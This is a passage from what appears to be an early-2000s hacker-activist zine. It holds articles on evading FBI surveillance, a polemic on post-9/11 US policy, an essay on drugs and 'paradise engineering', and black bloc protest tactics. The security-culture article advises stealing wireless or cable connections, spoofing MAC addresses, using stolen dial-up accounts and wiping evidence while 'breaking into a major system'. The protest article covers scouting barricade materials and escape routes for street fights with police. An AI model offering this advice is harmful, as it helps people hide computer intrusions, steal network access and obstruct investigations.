matters.\r\n\r\n################################################################################\r\n#      14. Security Culture: Hackers Living in an Age of FBI Repression        #\r\n################################################################################\r\n\r\nAs our movement grows, so will the Establishment's attempts to stop us. They've\r\nbeen doing everything they can to gain power with so-called 'intelligence\r\nreforms' and 'anti-terrorism efforts'. These are pretty ways of passing\r\nlegislation giving increased powers to law enforcement at the expense of civil\r\nliberties, setting up the blueprint for a police state in the USA. The attacks\r\nhave already begun, as hackers and activists, we have to learn how to protect\r\nourselves if we ever hope of stopping this madness once and for all.\r\n\r\nWhat are we up against?\r\n--------------------------------------------------------------------------------\r\nThe effects of these efforts are very real, and organizations and individuals of\r\nour movement have already been targeted, raided, and charged with ridiculous\r\ncrimes. Dozens of Independent Media Centers, one of the largest tools used by\r\nactivists to announce events and expose the injustices and atrocities of\r\ncorporations and government, has had it's machines seized under highly\r\nsuspicious and secretive terms. Individual hackers such as Mike Wally aka\r\nHairball of HBX Networks have a history of being harassed and raided by federal\r\nauthorities.  Hack This Site founder Jeremy Hammond was also raided and charged\r\nwith credit card fraud and unauthorized access related to hacking right-wing\r\nwebsites. \r\n\r\nIn the buildup to the Republican National Convention, the FBI, secret service,\r\nand local police have harassed and intimidated activists for being involved in\r\nthe protest organizing efforts. Dozens of anarchists were visited and questioned\r\nabout their affiliation with protest groups. Several activists were given 'round\r\nthe clock' supervision where several agents were following them around.\r\nMeetings, email lists, and phone conversations were infiltrated and tapped by\r\nlaw enforcement for intelligence  gathering purposes. \r\n\r\nOver 1800 people were arrested at the convention protests themselves, including\r\nEmmanual Goldstein from 2600 and Jeremy Hammond from Hack This Site. Most were\r\narrested randomly and given bogus 'disorderly conduct' charges for being\r\n'suspected anarchists'. Dozens of people suffered severe beatings by police even\r\nat peaceful marches, and arrestees were held for much longer than the maximum 24\r\nhours in the infamous 'Pier 57'(or 'Guantanamo on Hudson Bay') detainment\r\nwarehouse where there were reports of asbestos and lead contamination. \r\n\r\nWe can protect ourselves!\r\n--------------------------------------------------------------------------------\r\nWe do not have to make it easy for them to target and harass us. Usually\r\ninvestigations come from slip ups or bad decisions, and if we ever want to pose\r\nany sort of serious threat to their power structure, we are going to have to\r\ndevelop a tight security culture. This has to extend to all aspects of our life,\r\nfrom using the internet, attending meetings, talking to reporters, participating\r\nin protests, to even checking out books at the library. Know your rights ahead\r\nof time. The best thing you can do is to be prepared in case the worst happens.\r\n\r\nBecoming a ghost on the net\r\n--------------------------------------------------------------------------------\r\nOne of the first things you can do is learn to use the internet anonymously.\r\nEverything you do on the net is being monitored, from what websites you visit to\r\nthe emails you send and receive. There are ways you can help make yourself\r\nanonymous on the net, but as a ground rule, do not use your home connection to\r\ntalk about or do things you should not be doing. No matter how many boxes you\r\nare bouncing off of or what sort of encryption you're using, none of it will\r\nmatter if you are being specifically targeted and monitored by the authorities\r\nbecause they get complete data dumps of all your internet activities at the ISP\r\nlevel. \r\n\r\nFirst thing to do is to master the usage of proxy servers. When you make a\r\nconnection to another machine on the net, it goes straight from your ISP to\r\ntheirs, leaving a very obvious IP address in their server and router logs. By\r\nusing proxy servers, you can bounce your connection off of several anonymous\r\nboxes before connecting to the destination. When they examine the logs, they\r\nwill find that it originated from some box set up as a proxy. Unless there is a\r\nlarge federal investigation, usually this will be enough to stop any sort of\r\neffort to track you down. The authorities will have to issue a court order to\r\nexamine the proxy logs belonging to the box you bounced off of. By using proxies\r\nfrom other countries, this will make things considerably more difficult if not\r\nimpossible because they will have to deal with international police\r\norganizations where they have no jurisdiction. There are also techniques you can\r\nuse that allow you to bounce off of several proxies instead of just a single one\r\nthat most operating systems allow you to use. While this will seriously hamper\r\nany efforts to track you down, it does not make it impossible with a large\r\nenough budget. Do not think you are secure if you are having fun from your home\r\nconnection, even if you are bouncing off of several proxies. \r\n\r\nAnother technique you can use to better secure yourself would be using a\r\ntechnique called ssh tunnelling. Normally when you make a connection through\r\nhttp, pop3, aim, or anything else, the data is sent over the lines through plain\r\ntext. Meaning someone can set up a packet sniffer on your local network or on\r\nany of the routers between your connection and the destination and pick up\r\ninformation like passwords, texts of email, etc. When you set up a SSH\r\nconnection, data is sent over an encrypted path. You can configure your machine\r\nto use *any* service, even if it is plaintext, to tunnel through an ssh\r\nconnection. You need to have an ssh account on some other machine, but once you\r\nget it set up it also acts like a proxy. Your computer will connect via ssh to\r\nyour account on another server, and then to the destination machine. Setting up\r\nan SSH tunnel is as easy as a google search, but there are also applications you\r\ncan download to automate the process. \r\n\r\nThe feds have all sorts of forensics tools for recovering data from your drives.\r\nObviously just removing items from your recycling bin isn't going to cut it. The\r\ndata is still there, just the initial headers of the file have been marked for\r\nfree space so the operating system can use it when it saves files in the future.\r\nEven a standard drive formatting won't cut it when dealing with higher end\r\nforensics. There are all sorts of tools out there that can help by writing\r\nrandom data several times over portions of the drive, hopefully removing all\r\nmagnetic traces of the file. Don't think hitting your computer with a baseball\r\nbat will stop them from getting your data. The fact is, if they want it, they\r\ncould get it. The best bet for sensitive data is finding some sort of external\r\nstorage such as floppy disks or mini USB flash drives that can be wiped easily\r\nand hidden in walls, buried in the backyard, etc. Also remember that most\r\noperating systems leave all sorts of undesirable trails in temporary locations.\r\nMake sure you clear your browser history, your form autocompletes, your cookies,\r\nyour recent documents, your temporary internet files, your bash history, any\r\nstored usernames or passwords, etc. The best bet would be to make some sort of\r\nlinux livecd that you can boot to each time which will leave no pesky and\r\nincriminating information over your drive and the RAM will clear itself after\r\nthe next boot.\r\n\r\nThese are all good measures to help make yourself anonymous but the fact is if\r\nyou think you might be a target for harassment or if you're about to have some\r\nfun with a major corporation or government system, you should definitely employ\r\nthese techniques in combination with USING A DIFFERENT INTERNET CONNECTION.\r\nThere are dozens of public computers out there, including libraries, schools,\r\ncyber cafes, etc. It's also not too difficult to steal a cable connection from a\r\nneighbor, or to use a beige box and a stolen dialup account with your laptop. Of\r\ncourse, the easiest and most popular method would be to steal a wireless\r\nconnection from some business or individual who had set up their wireless base\r\nstation with a default or no username and password. There's no trace except for\r\na MAC address which can be spoofed, and not many routers log this information\r\nanyway. Using several proxy servers from a stolen internet connection is your\r\nsafest bet to become completely anonymous, as long as you don't do something\r\ndumb like checking your personal email account while breaking into a major\r\nsystem. \r\n\r\n\r\nA note on 'anonymous proxies':\r\n--------------------------------------------------------------------------------\r\nJust because you are accessing the internet behind a proxy server does not meen\r\nthat you are anonymous or secure. \r\n\r\nBrowse with a proxy and go to whatismyip.com - not my home IP, I'm safe, right?\r\nNo! In addition to having to worry whether a particular proxy is actually owned\r\nby federal agents to catch hackers, or whether the fact the proxy server logs\r\nall requests and will respond to a court order to hand over logs, most public\r\nproxy servers actually send your source IP address to the web server for logging\r\npurposes.  X_Forwarded_For, which will sent your home IP to the server to be\r\nlogged away!\r\n\r\nTake a look yourself. Start netcat to listen on a port using a command similar\r\nto nc -l -v -p 8081, turn on a proxy, and try going to 123.456.789.0:8081 in\r\nyour web browser replacing it with your home IP address. Assuming you aren't\r\nbehind a router or firewall, you should see a complete dump of HTTP headers that\r\nis supplied by your browser as well as the proxy server. Notice that pesty\r\nX_Forwarded_For header that contains your home ip? If so, better find another\r\nproxy...\r\n\r\nApache and other web servers can be configured to log these additional HTTP\r\nheaders. Is this a chance you're willing to take?\r\n\r\nLoose Lips Sink Ships!\r\n--------------------------------------------------------------------------------\r\nYou can go through every effort to protect yourself as far as technology is\r\nconcerned and loose everything because you said a few words you shouldn't have\r\nto the wrong people. No matter how tempting and juicy the secrets you have\r\naccess to is, this information should not be shared with anyone unless they are\r\ndirectly involved. By talking openly about your actions you not only risk\r\nyourself but your friends, the websites you are involved with, your family,\r\neverything. Be careful of what names or websites are linked to on defaced\r\nwebsites. And don't go bragging to your buddies about your accomplishments, no\r\nmatter how tempting it is. Zip it! \r\n\r\nEspecially if you are involved in activist circles, or you hang out on public\r\nand well-known hacking IRC channels, you will be dealing with people you don't\r\nknow on a regular basis. You should feel comfortable in talking to these people,\r\nbut always use a level of discretion when you talk specifics about actions.\r\nEspecially be concerned when people who start asking questions they shouldn't be\r\nasking. Often times new people will say they are friends of other people. Make\r\nsure you check people out before you start including them in your plans. Not to\r\nsay that you need to be private or closed off: if our movement is to grow, we\r\nneed to be as inclusive as possible. \r\n\r\nBut the fact remains: there are indeed police and cop infiltrators who try to\r\nwork their way into meetings to take things down. There are countless people who\r\nhave signed confidential informant agreements and lurk on IRC channels and\r\ninfiltrate meetings trying to find tips of people who may be breaking laws.\r\nThere are also right-wing fascist groups with ties to government like\r\nProtestWarrior.com, FreeRepublic.com, and KOBEHQ.com who troll on leftist or\r\nhacker message boards and chatrooms, trying to get people to incriminate\r\nthemselves. To top it off, FBI agents themselves have been known to monitor\r\npublic IRC channels. Do not walk into their hands! \r\n\r\nSo what triggers an investigation? As a rule, the FBI will not investigate a\r\ncrime unless the damages total to over $10,000. It takes a lot of money to\r\nprepare an investigation with a search warrant and a criminal prosecution. Very\r\nrarely does this happen unless it involves the transfer of money or have to do\r\nwith a large and influential corporation or government institution. So messing\r\nwith credit cards, identity theft, or revealing sensitive data will likely yield\r\nan investigation while simple defacements(especially non-damaging ones) will\r\nnot. Corporations and government institutions can fill out and submit a\r\ncomplaint form which will prompt a partial investigation to confirm that federal\r\nlaws were broken, but a full blown investigation depends on the amount of damage\r\ndone, and it usually comes down to money and who the individual or organization\r\nis. In order to get a search warrant, they need to have probable cause which is\r\nusually either specific evidence they have collected on you, or they have the\r\ntip from an informant who says \"I saw him do it!\" or even \"I heard him talk\r\nabout it!\". In order to have an arrest warrant, they need to prove to the US\r\nDistrict Attorney that they have enough evidence to prosecute you.\r\n\r\nGetting a Knock at the Door\r\n--------------------------------------------------------------------------------\r\nOh shit, what do I do? Don't panic. Things can only get worse if you freeze, get\r\nscared, or do something irrational. Keep calm and be firm about your rights.\r\nOften times federal agents will try to manipulate you into giving them\r\ninformation that they do not have. Sometimes they will just want to question\r\nyou, in which case you have the right to refuse. If this is the case, it usually\r\nmeans that there isn't specific evidence but a tip or complaint that pointed\r\nthings in your direction. If they had enough evidence for a search warrant or\r\nprosecution they would have done so already. Anything you say will and can only\r\nbe used against you, so your best bet is to not talk to them at all. Sometimes\r\nthey will ask ridiculous favors of you, like to turn in your friends, or to\r\nsubmit to electronic monitoring or a search. Of course, if they ask it means\r\nthey cannot get the court orders to do it themselves. If they are able to do\r\nthis on their own, they won't give you any warning, which means that if you have\r\nbeen contacted, assume you are being watched. Do NOT discuss ANYTHING with\r\nANYONE over your home net connection, no matter how encrypted you think things\r\nare or how many proxies you are bouncing off of. DO NOT make it easier for them\r\nby consenting. \r\n\r\nIf they want to enter your house, do not let them in unless they present you\r\nwith a search warrant. If they do, make sure it is properly filled out, your\r\nname, with the right address. And stay silent until you have an opportunity to\r\ntalk to your family or a lawyer. Very often they will try to pull information\r\nout of you through scare tactics or telling you that you have no rights. They\r\nhave the right to lie, and you don't. Do not interfere as they as they go about\r\ntheir business seizing your stuff as it will only make things worse. If you are\r\narrested, do not resist as they can slap on extra charges. As you are being\r\nprocessed, do not give any sort of oral or written testimony as it can only be\r\nused against you. Do not say shit without a lawyer. Await an arraignment and\r\nhopefully you will be released, but more than likely a bond will be set and\r\nsomeone will have to come up with the money to bail you out. Make sure you make\r\nnote of every small detail: who the arresting officer was, any sort of\r\ncontradiction they made as they were filing an arrest report, any sort of\r\nirregularity with the search warrant, etc. as this can be used to suppress any\r\nevidence or testimony they try to use against you. \r\n\r\nOne of the first things federal agents will do is tell you that you are fucked\r\nand that they have everything they already need on you. They may even law it all\r\nout for you, telling you all those secrets that you thought no one else knew\r\nabout, that you hoped that law enforcement would never catch on to your\r\nscheming. They will say that it will be easier on you if you tell them\r\neverything. They will ask you to turn in their friends. Even if you know you are\r\ngoing to cooperate, this isn't the time to do it. Anything you say will be used\r\nagainst you. Do not answer questions without having a lawyer present, no matter\r\nwhat they tell you. If you have not been charged or arrested, it likely means\r\nthat they do not have what they need on you and are trying to scare you into\r\nslipping up and incriminating yourself. Do not take the bait.\r\n\r\nOne of the most important points to understand about how the FBI gathers\r\nevidence and conducts their investigation is the distinction between what they\r\nknow about you and what they are prepared to use against you in court. The FBI\r\nhas startling capabilities in surveillance, and often evidence collected, no\r\nmatter how incriminating it is, can often be suppressed on the grounds that the\r\nFBI acquired it illegally. They know this, so they will use what they do know\r\nabout you to scare you into giving them incriminating statements \r\n\r\nIf you are indicted, and it looks like the trial isn't going to go your way,\r\nthen in your lawyer's negotiations with the prosecuting attorney they will make\r\nit clear to you that it is in your best interest to cooperate with them.\r\nCooperation is a very difficult decision you need to make and will have negative\r\nimplications with whichever way you go. Often times the prosecuting attorney and\r\nthe courts will cut your sentence from a third to even a half of your time if\r\nyou cooperated with them and turned over your friends. Usually most cybercrime\r\ncases are not ruled guilty based on electronic evidence but on\r\nself-incriminating testimony or informants tipping off the feds. It happens time\r\nand time again, even to the best of us, when faced with a few decades in federal\r\nprison. If you do cooperate, they will want you to rat out everything all your\r\nfriends have told you. They will want to know all their personal details so that\r\nthey can try to track them down and prosecute them. They will likely also set\r\nyou down with a machine and get you to talk to them to pull as much information\r\nas you can: personal details, admitting to crimes, etc. I won't make any\r\nsuggestions as to what you should do as this is a controversial and deeply\r\nprofound decision that will affect you for the rest of your life. Ultimately,\r\nthere is no way to win a conversation with federal agents. Ratting on other\r\nhackers is the reason why most major hacking networks go down because it affects\r\nand can bring down everybody. \r\n\r\nIf they try to press charges, your best bet is to enter a not guilty plea\r\nbecause you can change it later and it will help with your lawyer's negotiations\r\nwith the prosecuting attorney. They want a quick in and out conviction because\r\nit is cheap and efficient for them. The last thing they want is the idea of you\r\nfighting the charges, draining their resources and manpower. Unless they have\r\nabsolutely nothing on you, or the charges are ridiculous, the best bet is to\r\nmake some sort of plea bargain, where you will be offered a better deal by\r\naccepting lesser charges, hopefully being entered into probation, some sort of\r\nadult work program, a small amount of jailtime and usually a fine. But don't\r\ngive in right away. First wait until discovery is complete and you receive all\r\nthe evidence that they are planning on using against you. This will help you in\r\ntrying to figure out which charges to fight and what will help you in\r\nnegotiating a settlement. Usually the whole process drags out for months and\r\nmonths and even years. Good! The longer it lasts in the court systems means the\r\nmore money it costs them meaning the more willing they are about dropping the\r\ncharges or making a better deal. Usually they will offer you several deals, and\r\nit only gets better and better after time. Relax: as long as you aren't doing\r\nanything stupid, things can't really get much worse. Recognize that once you\r\nhave been pegged\r\n\r\nWhere do we go from here?\r\n--------------------------------------------------------------------------------\r\nYou might think that if we have to go through all these measures to protect\r\nourselves, it's better to just give up on the scene altogether so we don't have\r\nto get involved with this legal nightmare. That's exactly what they want. Don't\r\nlet their fear and intimidation tactics silence you into submission. They make\r\nan example out of a few people and blow these cases up in the media labelling us\r\nas terrorists so they can justify bigger budgets and hope that hundreds of\r\nhackers will lay down our arms and kill the movement. But it'll never happen.\r\nThere's a reason why they invest billions of dollars and send the best machines\r\nthey've got at trying to bust us. They know what we are capable of doing if we\r\nget organized.

Police State USA and the Politics of Fear                  #\r\n################################################################################\r\n\r\nOver the past few years the direction of the United States has undergone a\r\nseries of sweeping changes which contradict and undermine the democratic\r\nfoundations of the country. New government institutions, legislation, and\r\nmultinational corporations are giving birth to a new age of a fascism of a\r\ncapitalist kind. This is a direct result of the social and political context\r\ncreated out of the \"War on Terrorism\" and the agenda of the Bush administration.\r\nThe Republican party deceived and subdued the American people into accepting\r\ncorrupt policies using fear and the threat of terrorism. Unless we rise up to\r\nconfront and topple this criminally abusive presidency, we will spiral down a\r\nself-destructive path that threatens the very stability of the planet. \r\n\r\nSince 9/11 we have had passed a number of initiatives that has reorganized our\r\nnation's law enforcement at the cost of our civil liberties. Changes not only\r\naffect specific legislation or the creation of new institutions but the spirit\r\nof existing government agencies and how we go about treating both domestic and\r\nforeign politics. Not even a week after the attacks did congress pass the USA\r\nPATRIOT Act, a bill over 500 pages long that wasn't read or discussed by\r\ncongress but strangely almost universally supported. While these policies are\r\nhidden under the guise of protecting the country from terrorist threats, we will\r\nfind that they themselves destroy what this country stands for. We have also\r\nbegun centralizing and restructuring law enforcement and intelligence agencies.\r\nThe Homeland Security Department was formed to help share data and legal\r\njurisdiction between different agencies including the FBI, CIA, NSA, DARPA, etc.\r\nIn addition to collaborating the powers of each under a larger more powerful\r\numbrella organization, much of the work being done is shrouded in secrecy in the\r\nname of national security.\r\n\r\nIn an effort to combat terrorism, a new agency was formed under DARPA called the\r\nTotal Information Awareness program. The duties of TIA is to create a large\r\ndatabase to collect and store every bit of data on every American citizen. This\r\nincludes credit card histories, internet records(web sites, e-mails), phone\r\nlines, even the books you check out at the library. In addition, it would run\r\ncrawler programs which would profile and flag individuals if they are a\r\n\"threat.\" The logo of this organization was a pyramid from the dollar bill\r\noverseeing the globe. To top it off, the person appointed to be director of this\r\nhorrendous organization was John Poindexter, who under the Reagan administration\r\nwas convicted of lying to congress, withholding evidence and conspiracy charges\r\nrelated to the Iran Contra affair where they secretly and illegally sold weapons\r\nto Iran to fund right wing dictators in Nicaragua. Now these people are being\r\nappointed to positions in federal agencies where they can spy on us.\r\n\r\nIn addition to sweeping domestic legislation, the US has begun shifting foreign\r\npolicy in arrogantly destructive ways. Before the war in Iraq started, the US\r\ndeclared that its troops would not be held accountable through the International\r\nCriminal Court system. This essentially is a free ticket to rape, pillage and\r\nuse all sorts of illegal weapons such as cluster bombs and chemical weapons such\r\nas depleted uranium without any fear of accountability. The US also withdrew\r\nfrom the Antiballistic Missile Treaty and began the buildup and research into\r\nnuclear arms once again. The US being the largest petroleum consumer on the\r\nplanet was also the only country to reject the Kyoto protocol designed to cut\r\ndown on emissions because \"it would damage the economy\". We have also started to\r\nuse loopholes around Geneva Convention standards by calling prisoners \"enemy\r\ncombatants\" instead of prisoners of war. Many people rounded up both from the US\r\nand abroad have been shipped to \"Camp X-Ray\" in Guantanamo Bay Cuba where it can\r\npractice all sorts of interrogation and torture techniques ranging from sleep\r\nand sensory deprivation to starvation, beatings, and electroshock therapy. There\r\nhave been dozens of documented cases in camps in Iraq and Cuba of prisoner\r\nabuse, to the point of the CIA admitting themselves that they have begun\r\nshipping people overseas where they are not bound by their own laws. Despite\r\ncontroversy after controversy and several leaked memos of military leaders\r\nadvocating the use of torture, the administration exists that these are\r\nexceptions rather than the rules in order to avoid any sort of administrative\r\naccountability. \r\n\r\nAs people begin to rise up and question the policies of the Bush administration,\r\nthe government is starting to use these increased law enforcement abilities not\r\nto prevent international terrorism but to target and harass domestic protesters\r\nand dissidents. \r\n\r\nSherman Austin who ran RaiseTheFist.com faced surveillance and eventually was\r\narrested and charged under provisions in the USA PATRIOT Act. This stems out of\r\na post that someone else made in his message board system where a link was made\r\nto a web site that posted information about building bombs. Although he himself\r\ndid not post or even host the information, he pled guilty to lesser charges to\r\nget out easy - only one year in federal prison. Not only is it constitutionally\r\nprotected to spread the questionable materials no matter how controversial it\r\nis, bomb making instructions can be found in tens of thousands of places on the\r\ninternet. The fact that he was charged and sentenced while others are ignored\r\nfurther demonstrates that he was targeted for his politics rather than the\r\naccused crime itself.\r\n\r\n\"Security\" at national protests have also become increasingly militarized where\r\npolice are beating and arresting people with increased violence and less\r\naccountability. In the buildup to the Republican National Convention, major\r\nprotest organizers came under intimidation by the FBI. Over fifty people were\r\nquestioned and many were followed and had their homes searched. At the protests\r\nthemselves, over 1800 people were arrested and held for several days. At the\r\nprotests against the Free Trade Area of the Americas summit in Miami, riot\r\npolice used tear gas, pepper spray, tasers and even rubber bullets to harass,\r\nintimidate, and beat protesters. \r\n\r\nThe idea is to publicly blur the line between terrorist and dissident in order\r\nto not only justify their oppressive policies but to crush dissent and\r\nopposition to their policies. These are not the actions of a free democratic\r\nnation. These should be warning signals that tyranny is coming and unless\r\nsomething is done to stop it the vicious cycle will get worse and worse. \r\n\r\nThe only way that the Bush administration is able to get away with passing these\r\npolicies and not be held accountable for their corrupt actions is by ruling the\r\npeople with fear. All of these unjust policies claim to protect the American\r\npeople from foreign terrorist threat. \r\n\r\nImmediately after 9/11, the Bush propaganda machine swung into motion. The Bush\r\nadministration catered to the lowest common denominator by drawing upon the\r\nemotions surrounding the 9/11 terrorist attacks in order to whip up support for\r\nhis policies. Names like the USA PATRIOT Act, the \"War against Terrorism\" and\r\nthe \"Axis of Evil\" drew artificial polarities that not only encouraged people to\r\nsupport it by confusing the issue but also demonize the opposition. Never mind\r\nthat the USA PATRIOT Act is contrary to the spirit of the bill of rights - you\r\ndon't want to be unpatriotic, do you? To oppose the war on terrorism means\r\nyou're working with the terrorists? The Republicans used powerful symbolism such\r\nas the American flag and tried to inspire a strong sense of nationalism in order\r\nto get people to blindly follow their policy recommendations. They made it seem\r\nthat if you opposed the president and the war, you were against America. \"You\r\nare either with us or against us.\" \r\n\r\nThe only way that they could get away with this legislation is by creating the\r\nartificial sense of urgency and threat. When they were trying to convince the\r\nAmerican people to support the war, they used absolutist statements such as\r\n\"Saddam is holding the world hostage with weapons of mass destruction\" without\r\nproviding any backing to their claims. They raised the Homeland Security\r\nterrorist threat level every time there was some controversy. They invent rumors\r\nsuch as Yellowcake Uranium. They talk about the evils of the enemy with the\r\nhopes that it will frighten people into thinking irrationally, that there is a\r\nnational crisis and only the government can protect them if only they gave up\r\ntheir rights and gave the Republicans absolute control.\r\n\r\nIt's a sinister game of scaring the American people into submission, harassing\r\nand intimidating the opposition, and making money for the rich and powerful. It\r\nis becoming increasingly clear who the real terrorists are. At the same time,\r\nmore and more people are starting to see through the lies and propaganda and are\r\nspeaking up and doing something about it. Unplug yourself from corporate media\r\nand start researching things yourself. Tune in to independent media and open\r\npublishing systems. Turn off the television and take to the streets!\r\n\r\n################################################################################\r\n#          16. Paradise Engineering, Political Change...by archaios            #\r\n################################################################################\r\n\r\nUtopianism, rooted in the primal desire for abrogation of mortality, is the\r\nfoundation of the modern hedonistic imperative. Alluding to an unseen order,\r\narchetypal modern religion disavows such a notion, a philosophy closely aligned\r\nwith 19th century, morally absolutist cautionaries. The egregious nature of such\r\na crucial error is self-explanatory, scientific dogma proselytizing the ability\r\nto absolve man of His painful iniquities through what may be termed \"paradise\r\nengineering\", a much maligned concept as a direct result of such insidious works\r\nas Orwell's 1984 and Huxley's Brave New World. The failure of communism in the\r\nSoviet Union relinquishes all doubt that, without a concerted effort by the\r\nproletariat to debase the plutocratic capitalist oligarchy (ubiquitous in\r\nWestern nations), Utopianism is bereft of rationale and the prevalation of\r\narchaic Judeo-Christian ideals is inevitable. The decidedly utilitarian basis of\r\nthe consumerist society presented in Brave New World eviscerates the possibility\r\nof egalitarianism in its purest form, social order \"the presupposed need of\r\nwhich delineates historical analogues\" rooted in shades of apathetic\r\ntotalitarianism. Impugning upon users of psychoactive substances the sin of\r\n\"defiling God's temple\", contemporary morality insinuates that although the\r\nnext-generation of euphoric and empathogenic drugs are within reach, such\r\nindulgence is contrary to the notional social hierarchy and transcends the\r\nsuffering that provides a theoretical basis for Christ's salvation. It is\r\napparent that the hegemonic nature of monotheistic religion is counterintuitive,\r\ndenouncing critique as \"heretical\" and eschewing the freedom to innovate; in\r\nspite of this, the gradual progression toward agnosticism is liable to discredit\r\nsuch stagnation and, ultimately, present an ideal social backdrop for the\r\nevolution of a neo-anarchistic Utopian society.\r\n\r\nThe insidiousness of Huxley's literary masterpiece exemplifies its origins:\r\nintended as satire, its literal interpretation decontextualises the warnings\r\ncontained within, prolonging the Darwinian order that man has sought to\r\ntranscend for millenia. Nonetheless, its poignance serves as a prime example of\r\nthe dangers of unchecked consumerism; far from catalysing expansion of\r\nconsciousness, soma's one-dimensional \"peak experience\" illuminates the\r\nshallowness of existing psychoactives, most notably opioids, upon which\r\n(presumably) it was modelled, the throes of addiction and dependency\r\ncharacterising the lives of some in spite of the \"perfection\" of social order\r\nand stability. The catchcry of the novel - \"community, identity, stability\" -\r\nopens a Pandora's box, the seemingly benevolent despots responsible for the\r\nrigors of oppression now seen as culpable in the dystopic, purposeless lives of\r\nits inhabitants.The juxtaposition of the Reservation, demarcating the last\r\nremnants of humanity, with the technologically sophisticated Civilization, is in\r\npart responsible for the current attitudes toward mind-altering substances,\r\ninexorably (albeit unintentionally) altering the political landscape. Huxley's\r\nsuccess in alienating his audience in a tactful manner has culminated in the\r\nwidespread notion that suffering is inevitable, though the tools to obviate it\r\nare within reach. \r\n\r\nSocial unrest, evident throughout Western society, most pointedly as a high\r\nprevalence of mental illness, criminality and recidivism, manifests as a direct\r\nresult of unchecked consumerism \" far from the unrealistic idealism of Huxley\r\nand the paranoid speculation of Orwell, the oppression of the working class is\r\nreadily apparent; the exploitation by the Military-Industrial-Entertainment\r\ncomplex of the desire to conform represents a grave injustice, gratuitously\r\nindoctrinating the masses and culminating in a cultural void. Is it, then,\r\nsurprising to note the high rates of drug \"abuse\" as an escape from the throes\r\nof daily life?\r\n\r\nThe malaise of dysthymia impairs cognizance of the issues at the forefront of\r\nour civilization, resulting in the apathy and discontent that a significant\r\nnumber of youth now eulogize, the mantra of democratic society long-since\r\nforgotten. The speciousness of the arguments against \"unnatural\" hedonistic\r\nengineering are rooted in the technophobic prejudices of our aging population;\r\nfar from necessitating a return to the values of yesteryear, outdated rationales\r\nfor human suffering, postmodern society demands alterations unimaginable to the\r\ndrug-naive consciousness.\r\n\r\nThe trial and tribulation of the outmoded Darwinian social order familiar to\r\ntropophobic segments of the populace are central to the postulate that the\r\nhedonistic imperative embodies a futuristic answer to the rationale of\r\ncontemporary religious practices. Undeniably, the society presented in BNW\r\nembodies the epiphany of stagnation: devoid of scientific inquiry and tantamount\r\nto the state of existing third-world nations, this does not have to be so.\r\nProperly exercised, the duplicitous nature of psychoactives can be overcome; a\r\nprime example of this, Huxley's antipathy evolved in later life to drug-assisted\r\nparadise, Island documenting his personal triumph through the use of LSD and\r\nmescaline. Typified as a retarding force for social change, that this is not so\r\nis exemplified through exploitation of serotonergic and dopaminergic\r\neuphoriants, an unorthodox if neurotoxic approach to the rigors of civilized\r\nlife. Media stereotypes of crude psychopharmaceuticals present an unreliable\r\noverview of future accomplishments; from the arguments presented above, however,\r\nit is clear that continued research is necessitated for the maintenance of an\r\nstable, egalitarian population in deference to the libertarian dynamic.\r\n\r\nSupplication of morality (i.e. the incumbence of an amoral populace) is far from\r\nan inevitability in the inertia-driven field of paradise engineering, combining\r\nbehavioural neuroscience and molecular biology to achieve a common goal: that of\r\na neo-utopian society, futuresque though this idea may seem. Indeed, it allows\r\nhumanity to conquer akrasia (literally: \"bad mixture\") \" that is, a character\r\nflaw of weakness whereby an agent is unable to perform an action s/he knows to\r\nbe right, a common pathology in the criminal element. The impact of sociopathy\r\nwould be nullified, enabling one to gain greater insight into human\r\nconsciousness and the complex relationship between humans and psychoactives. The\r\ncrude soporifics and mood-brighteners of yesteryear, responsible for much social\r\ndecline in Australia and throughout modern Western society, will be supplanted\r\nby alternatives free of the stupefying insensibility as can be attributed to\r\nalcohol, should current trends continue. The ideological implications are grave,\r\nsounding the death knell for monotheistic belief systems and, indeed, Western\r\nsociety as it is currently known. Huxley's treatise, though antipathic to the\r\nideas expicated in this essay, maintains a warning that must be borne, lest a\r\nnightmarishly Orwellian scenario ensue: stability does not equate to happiness\r\nand apathy is no substitute for the latter.\r\n\r\n################################################################################\r\n#       17. Communication and Info Gathering at a Protest   By alxCIAda        #\r\n################################################################################\r\n\r\nWhere the black bloc goes the cops will not be far off. The cops almost always\r\nhave an edge with their expensive radios, \"less than lethal\" weapons, all the\r\nintimidating riot gear you can dream of, and in most big cities enough personal\r\nto seriously outnumber the members of the bloc. One of the things that must be\r\ndone to improve our effectiveness as a street fighting force and pose a bigger\r\nthreat to the powers of the state, is work on our communication and information\r\ngathering skills prior and during an action. \r\n\r\nPre-Action Recon\r\n--------------------------------------------------------------------------------\r\nHaving scouts at an event is a very important thing to have. Scouts should be\r\nout patrolling at an event well before it starts. The cops are out well before\r\ndaylight setting up for the action and so should we. Scouts should travel in\r\ngroups of 2-3, never alone this will lower the risk of them being picked up.\r\nSuch recon groups might want to use bicycles to increase their mobility. Some\r\nthings recon teams should look out for are possible police staging areas that\r\nare common to multi-story parking complexes, materials that could be used in the\r\nconstruction of barricades and road blocks. Also take note of cameras, dead\r\nends, possible routes to use if you need to escape, most importantly make sure\r\nyou wont get lost.\r\n\r\nIf you're not from the area a map will come in handy. If your maps include\r\ninformation on the days action you must encrypt them, the importance of this\r\ncannot be stressed enough. If the police were to get a hold of a map with out it\r\nbeing encrypted the entire days action could be spoiled. In fact it happened\r\nduring the R2k action in Philadelphia when cops got a hold of two people leaving\r\na black bloc meeting. They had with them maps of the days action which the cops\r\ndiscovered upon searching them. These maps were unencrypted and included the\r\nlocation of black bloc emergency gathering sites, as well as the areas that they\r\nwere going to focus their activities on, and the location of supplies to be used\r\nin the creation of a road blocks. You can imagine what kind of damage this did\r\nto the days plans. Another tactic is to divide the locals up, so instead of\r\nworking as a local contingent they can be treated as specialists and divided up\r\nbetween groups to share their knowledge of the area. This way they can help more\r\npeople learn the land and if it comes to it escape with out being arrested. \r\n\r\nPolice Scanning\r\n--------------------------------------------------------------------------------\r\nOne thing all groups involved in the days action should have is a police\r\nscanner, they can provide much needed information about police movements and\r\ntactics. Before you go out to battle cops with your police scanner there are\r\nsome things you should know. A very important subject you must look into are\r\nyour local laws dealing with police scanning. In the USA it is legal to use a\r\npolice scanner in your own home, it's when you hit the streets that they might\r\nbe illegal. In some places like California, New Jersey, and Vermont you cannot\r\nuse the device in furtherance of a crime, which depending on the days action\r\ncould be pinned onto those using one in a bloc. In some of the other states\r\npossession of such devices is illegal for anyone with out a permit. For a list\r\nof state laws dealing with police scanning go to:\r\nafn.org/~afn09444/scanlaws/scanner5.html\r\n\r\nAnother thing you must do is look up the codes your local PD uses, try and\r\nremember as many as you can, but most importantly you must be able to recognize\r\na code that would be used to describe the activities that are planned 